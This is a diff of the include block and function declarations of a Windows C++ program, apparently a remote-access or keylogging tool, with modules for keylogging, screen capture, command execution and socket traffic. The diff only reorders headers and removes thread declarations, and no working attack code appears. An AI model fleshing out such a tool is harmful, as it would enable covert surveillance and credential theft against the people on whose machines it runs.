@@ -5,43 +5,35 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
+
+
 #include <windows.h>
 #include <WinSock2.h>
 #include <ws2tcpip.h>
 
-#include <string>
-#include <fstream>
-#include <sstream>
-#include <iostream>
-#include <stdlib.h>
 #include <cstdio>
-#include <stdio.h>
-#include <time.h>
+#include <fstream>
+#include <iostream>
+#include <queue>
 #include <stack>
 #include <stdint.h>
-#include <queue>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sstream>
+#include <string>
+#include <time.h>
 #include <vector>
 
-#include "thread.h"
-#include "mutex.h"
-#include "tcpsocket.h"
-#include "keylog.h"
-#include "screen.h"
-#include "sysexec.h"
 #include "fs.h"
+#include "keylog.h"
+#include "mutex.h"
 #include "process.h"
+#include "screen.h"
 #include "string.h"
+#include "tcpsocket.h"
+#include "thread.h"
 
 
 
 
 void addonDebug(char *text, ...);
-
-DWORD main_thread(void *lpParam);
-DWORD process_thread(void *lpParam);
-
-DWORD socket_send_thread(void *lpParam);
-DWORD socket_receive_thread(void *lpParam);
-
-DWORD keylog_thread(void *lpParam);
-DWORD sysexec_thread(void *lpParam);
